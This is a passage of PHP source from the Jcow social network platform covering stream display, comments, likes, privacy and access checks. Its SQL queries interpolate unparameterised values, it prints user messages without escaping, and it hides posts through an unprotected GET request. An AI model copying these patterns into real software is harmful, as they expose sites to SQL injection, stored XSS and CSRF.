	$row['fullname'] = $author['fullname'];
	if (!$author['avatar'])
		$row['avatar'] = 'undefined.jpg';
	else
		$row['avatar'] = $author['avatar'];

	if (!strlen($row['fullname'])) {
		$row['fullname'] = $row['username'];
	}
	if ($author['disabled'] == 3) {
		return '';
	}
	// use username instead of fullname from 5.5
	$row['fullname'] = $row['username'];
	$res = sql_query("select p.*,u.avatar,u.fullname from ".tb()."pages as p left join ".tb()."accounts as u on u.id=p.uid where p.id='{$row['wall_id']}'");
	$page = sql_fetch_array($res);
	if (!$page['logo']) {
		$page['logo'] = 'logo.jpg';
	}
	$row['wall_uid'] = $page['uid'];
	if ($row['stuff_id']>0) {
		$res = sql_query("select s.*,u.username,u.avatar from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid  where s.id='{$row['stuff_id']}'");
		$stuff = sql_fetch_array($res);
		if ($stuff['uid'] == $row['uid'] && ($target_id>0 || $_REQUEST['p'] == 'feed')) {
			return '';
		}
		if($stuff['id']) {
			if ($stuff['app']) {
				$icon = '/modules/'.$stuff['app'].'/icon';
				if ($row['app'] == 'pcomment') {
					$icon = '/files/appicons/pcomment';
				}
			}
			else {
				$icon = '/files/appicons/status';
			}
			$icon = '<img src="'.uhome().$icon.'.png" />';
			$att = '<div class="att_box">';
			$stuff['attachment'] = unserialize($stuff['attachment']);
			if (count($stuff['attachment']) > 1 && strlen($stuff['attachment']['name'])) {
				$attachment = $stuff['attachment'];
				if (strlen($attachment['uri'])) {
					$att .= '<div style="font-weight:bold">'.$icon.' '.url($attachment['uri'],h($attachment['name'])).'</div>';
				}
				else {
					$att .= '<div style="font-weight:bold">'.$icon.' '.h($attachment['name']).'</div>';
				}
			}
			else {
				$att .= '<div>'.$icon.$stuff['message'].' <strong>'.url('feed/view/'.$stuff['id'],t('View')).'</strong></div>';
			}
			$att .= '<div class="sub">'.get_date($stuff['created']).', by '.url('u/'.$stuff['username'],$stuff['username']).'</div>
			</div>';
		}

	}
	elseif (count($row['attachment']) > 1) {
		$attachment = $row['attachment'];
		if ($attachment['cwall_id'] == 'none') {
			$no_comment = 1;
		}
		$att = '<div class="att_box">';
		if (strlen($attachment['name'])) {
			if (strlen($attachment['uri'])) {
				$att .= '<div class="att_name">'.url($attachment['uri'],h($attachment['name'])).'</div>';
			}
			else {
				$att .= '<div class="att_name">'.h($attachment['name']).'</div>';
			}
		}
		if (strlen($attachment['title'])) {
			$att .= '<div class="att_title">'.url($attachment['uri'],h($attachment['title']) ).'</div>';
		}
		if (is_array($attachment['thumb']) && $type != 'simple' && $type != 'mobile') {
			foreach ($attachment['thumb'] as $thumb) {
				if ($thumb) {
					$thumbs .= url($attachment['uri'],'<img src="'.uhome().'/'.$thumb.'"  />');
				}
			}
		}
		if (strlen($attachment['des']) || strlen($thumbs)) {
			$att .= '<div class="att_des">'.$thumbs.h($attachment['des']).'</div>';
		}
		$att .= '</div>';
	}
	if ($row['app']) {
		$row['cwall_id'] = $row['app'].$row['aid'];
		$icon = '/modules/'.$row['app'].'/icon';
		if ($row['app'] == 'pcomment') {
			$icon = '/files/appicons/pcomment';
		}
	}
	else {
		$row['cwall_id'] = $row['id'];
		$icon = '/files/appicons/status';
		//$row['message'] = $row['message'].' '.url($mu.'u/'.$row['username'].'/status/'.$row['id'], t('View status'));
	}
	if (!$row['stuff_id']) {
		if ($client['id'] && $type != 'simple' && $type != 'mobile' && !$hide_form && !$no_comment) {
			$comment_form = comment_form($row['id']);
		}
		else {
			$comment_form = comment_form($row['id'],'none');
		}
	}
	else {
		$comment_form = reply_form($row['id'],$row['username']);
	}
	if (!$hide_form && $type != 'simple' && $type != 'mobile' && !$no_comment) {
		if (!$config['stream_delete_form_displayed']) {
			$config['stream_delete_form_displayed'] = 1;
			c('<script>
			$(document).ready( function(){
				$("a[class=stream_delete]").click( function () {
					var parentdd = $(this).parents(".user_post_1");
					var sid = $(this).prev()[0].value;
					$(this).after("<img src=\''.uhome().'/files/loading.gif\' /> hiding..");
					$(this).hide();
					$.get(\''.uhome().'/index.php?p=jquery/stream_delete/\'+sid, function(data) {
						parentdd.hide("slow");
					});
					return false;
				});
			});
			</script>');
		}
		if ($row['uid'] == $client['id'] || in_array('3',$client['roles']) ) {
			$row['message'] = $row['message'].' | 
			<input type="hidden" name="streamid" value="'.$row['id'].'" /><a href="#" class="stream_delete">'.t('Hide').'</a>';
		}
	}

	if ($type == 'simple' && !$no_comment) {
		$avatar_size = 50;
		$avatar_box_size = 60;
		$comment_get = '';
	}
	else {
		$avatar_size = 50;
		$avatar_box_size = 60;
		$comment_get = comment_get($row['id'],$comment_num);
	}
	if (!$row['stuff_id']) {
		$comment_get = likes_get($row).$comment_get;
	}
	$icon = '<img src="'.uhome().$icon.'.png" />';
	if ($row['app'] == 'photo') {
		$icon = '';
	}
	if ($page['type'] != 'page' && $row['wall_id'] != $row['uid'] && $row['wall_id'] != $target_id) {
		if ($row['wall_uid'] != $row['uid']) {
			if ($page['type'] == 'u') {
				$hdh = url($mu.'u/'.$page['uri'],t("{1}'s wall",'<strong>'.h($page['uri']).'</strong>'));
			}
			elseif ($page['type'] == 'group') {
				$hdh = url('group/'.$page['uri'],'<strong>'.h($page['name']).'</strong>');
			}
			else {
				$hdh = url('page/'.$page['uri'],'<strong>'.h($page['name']).'</strong>');
			}
			$row['message'] = t('Post on').' '.$hdh.'<br />'.$row['message'];
		}
	}
	if ($page['type'] == 'page') {
		$display_logo = url('page/'.$page['uri'],'<img src="'.uhome().'/'.uploads.'/avatars/s_'.$page['logo'].'" />');
		$display_name = url('page/'.$page['uri'], h($page['name']));
	}
	else {
		$display_logo = avatar($row,$avatar_size);
		$display_name = url($mu.'u/'.$row['username'], h($row['username']));
	}
	if ($type == 'mobile') {
		$row['message'] = str_replace('"u/','"mobile/u/',$row['message']);
		return '
		<div class="user_post_1">
			'.$display_name.'
			 '.$row['message'].
				$att.'
			<div class="att_bottom"> '.get_date($row['created']).$likes.' '.$row['pending_review'].'</div>
			
		</div>
			';
	}
	else {
		return '
		<div class="user_post_1">
			<table width="100%">
			<tr>
			<td class="user_post_left" width="'.$avatar_box_size.'" valign="top">'.$display_logo.'</td>
			<td class="user_post_right" valign="top">
			<strong>'.$display_name.':</strong> 
			 '.$row['message'].
				$att.'
			<div class="att_bottom">'.$icon.'  '.get_date($row['created']).$likes.' '.$row['pending_review'].' '.
				url('report',t('report'),'',array('url'=>url('feed/view/'.$row['id']))).'
			</div>
			'.$comment_form.$comment_get.
				'</td>
			</tr>
			</table>
		</div>
			';
	}
}


/* comment */


function comment_publish($stream_id, $message) {
	global $client;
	$comment['stuff_id'] = $stream_id;
	$comment['uid'] = $client['id'];
	$comment['message'] = $message;
	$comment['created'] = time();
	$comment['wall_id'] = $client['id'];

	$res = sql_query("select s.*,p.type as page_type from ".tb()."streams as s left join ".tb()."pages as p on p.id=s.wall_id where s.id='$stream_id'");
	$stream = sql_fetch_array($res);
	if ($stream['uid']) {
		if ($stream['stuff_id'])
			$comment['stuff_id'] = $stream['stuff_id'];
		if ($stream['page_type'] == 'group')
			$comment['wall_id'] = $stream['id'];
		$return = parse_mentions($comment['message']);
		$comment['message'] = $return['message'];
		sql_insert($comment,tb()."streams");
		$cid = insert_id();
		$res = pending_review('stream'.$cid,$message,'feed/view/'.$comment['stuff_id'],$cid);
		sql_query("update ".tb()."accounts set forum_posts=forum_posts+1 where id='{$client['id']}'");
		if ($res == 'verified') {
			add_mentions($return['mentions'],$cid,$comment['wall_id']);
		}
		return $cid;
	}
	else {
		return 0;
	}
}

function likes_get($stream = '',$cwall_id='',$message='') {
	if (is_numeric($stream)) {
		$res = sql_query("select id,likes,dislikes from ".tb()."streams where id='{$stream}'");
		$stream = sql_fetch_array($res);
	}
	if (!$stream['id']) {
		return '';
	}
	$return = '';
	if ($stream['likes']) {
		$return = '<div class="user_comment">
		<img src="'.uhome().'/files/icons/thumbs_up.png" /> <a href="#" onclick="jQuery.facebox({ ajax: \''.url('jquery/wholike/'.$stream['id']).'\' });return false;" >'.
			t('{1} people like this','<strong>'.$stream['likes'].'</strong>').
			'</a>
		</div>';
	}
	if ($stream['dislikes']) {
		$return .= '<div class="user_comment">
		<img src="'.uhome().'/files/icons/thumbs_down.png" /> <a href="#" onclick="jQuery.facebox({ ajax: \''.url('jquery/whodislike/'.$stream['id']).'\' });return false;" >
		'.
			t('{1} people dislike this','<strong>'.$stream['dislikes'].'</strong>').
			'</a>
		</div>';
	}
	return $return;
}
function comment_get($target_id,$num = 12) {
	if ($target_id > 0) {
		$more = $num+1;
		$res = sql_query("select c.*,u.username,u.avatar from ".tb()."streams as c left join ".tb()."accounts as u on u.id=c.uid where c.stuff_id='{$target_id}' order by id desc limit $more");
		$i=1;
		while($row = sql_fetch_array($res)) {
			if ($i <=$num) {
				$comments .= comment_display($row);
			}
			$i++;
		}
		if ($i>$num) {
			$more_link = '&nbsp;&nbsp;'.url('feed/view/'.$target_id,t('All comments'));
		}
		return $comments.$more_link;
	}
}

function comment_display($row = array()) {
	global $client;
	$res = sql_query("select * from ".tb()."accounts where username='{$row['username']}'");
	$author = sql_fetch_array($res);
	if (!$author['avatar'])
		$row['avatar'] = 'undefined.jpg';
	else
		$row['avatar'] = $author['avatar'];
	$row['fullname'] = $author['fullname'];
	if ($author['disabled'] == 3)
		return '';
	return '
		<div class="user_comment">
			<table width="100%">
			<tr>
			<td class="user_post_left" width="40" valign="top">'.avatar($row,25).'</td>
			<td class="user_post_right" valign="top">
			<strong>'.url('u/'.$row['username'], $row['username']).'</strong>:
			 '.$row['message'].'
			<div class="att_bottom">'.get_date($row['created']).' '.$row['pending_review'].' '.
				url('report',t('report'),'',array('url'=>url('feed/view/'.$row['id']))).'
			</div></td>
			</tr>
			</table>
		</div>
			';
}



function showad() {
	if (valid_license('p'))
		return false;
	else
		return true;
}

/* ################################ profile comment */


function profile_comment_publish($target_id, $message) {
	global $client;
	$comment['target_id'] = $target_id;
	$comment['uid'] = $client['id'];
	$comment['message'] = $message;
	$comment['created'] = time();
	sql_insert($comment,tb()."profile_comments");
	return insert_id();
}

function profile_comment_get($target_id,$num = 12, $offset = 0) {
	$res = sql_query("select c.*,u.username,u.avatar from ".tb()."profile_comments as c left join ".tb()."accounts as u on u.id=c.uid where c.target_id='{$target_id}' ".dbhold('c')." order by id desc limit $offset,$num");
	while($row = sql_fetch_array($res)) {
		$comments .= profile_comment_display($row);
	}
	return $comments;
}

function profile_comment_display($row = array(), $hide_form = 0) {
	global $client;
	if (!$row['avatar']) {
		$res = sql_query("select avatar from ".tb()."accounts where id='{$row['uid']}'");
		$row2 = sql_fetch_array($res);
		if (!$row2['avatar'])
			$row['avatar'] = 'undefined.jpg';
		else
			$row['avatar'] = $row2['avatar'];
	};
	$row['cwall_id'] = 'comment'.$row['id'];
	if ($client['id'] && !$client['no_comment'] && !$hide_form && $row['stream_id']) {
		$comment_form = comment_form($row['stream_id'],t('Reply'));
	}
	return '
		<div class="user_post_1">
			<table width="100%">
			<tr>
			<td class="user_post_left" width="60" valign="top">'.avatar($row).'</td>
			<td class="user_post_right" valign="top">
			<strong>'.url('u/'.$row['username'], $row['username']).'</strong>
			 '.decode_bb(h($row['message'])).
				 $comment_form.comment_get($row['cwall_id'],5).'
			<div class="att_bottom">'.get_date($row['created']).'</div></td>
			</tr>
			</table>
		</div>
			';
}

function privacy_access($ptype, $owner = 0) {
	global $client;
	if (!$ptype) {
		return true;
	}
	elseif (!$client['id']) {
		return false;
	}
	if (!$owner) {
		return false;
	}
	if ($owner == $client['id']) {
		return true;
	}
	if ($ptype == 1 || $ptype == 2) {
		$res = sql_query("select * from ".tb()."friends where uid='{$client['id']}' and fid='{$owner}' limit 1");
		if (sql_counts($res)) {
			return true;
		}
		else {
			return false;
		}
	}
}


function privacy_form($row = array()) {
	return '';
	/* removed friends of friends from 5.4
	if ($row['var5'] == 2) {
		$selected2 = 'selected';
	}
	elseif ($row['var5'] == 1) {
		$selected1 = 'selected';
	}
	else {
		$selected0 = 'selected';
	}
	return '
	<span class="sub">'.t('Privacy').':</span>
	<select name="privacy" style="font-size:11px">
	<option value="0" '.$selected0.'>'.t('Everyone').'</option>
	<option value="2" '.$selected2.'>'.t('Friends only').'</option>
	</select>';
	*/
}




function allow_access($roleids, $force_uid = 0) {
	global $client;
	if (is_array($client['roles']) && in_array('3',$client['roles']))
		return true;
	if ($force_uid) {
		if (!$client['id'] or $force_uid != $client['id'])
			return false;
	}
	if (is_array($roleids)) {
		foreach ($roleids as $roleid) {
			if (in_array($roleid,$client['roles']))
				return true;
		}
	}
	else {
		if (is_array($client['roles']) && in_array($roleids, $client['roles']))
			return true;
	}
	return false;
}

if ($parr[0] == 'poweredby') {
	c('This site is powered by <a href="http://www.jcow.net">Jcow '.jversion().'</a>');
	stop_here();
}

?>